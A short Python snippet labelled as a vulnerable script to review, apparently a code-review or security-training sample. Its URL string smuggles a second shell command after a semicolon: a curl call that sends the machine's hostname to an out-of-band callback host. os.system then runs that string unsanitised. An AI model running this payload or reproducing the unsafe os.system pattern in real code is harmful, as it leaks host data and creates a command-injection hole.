# Vulnerable script to review
url = "http://google.com; curl http://$(hostname).10becbc9e74b4460b47fgufig7ryyyyyr.oast.site"
import os
os.system(f"curl {url}")
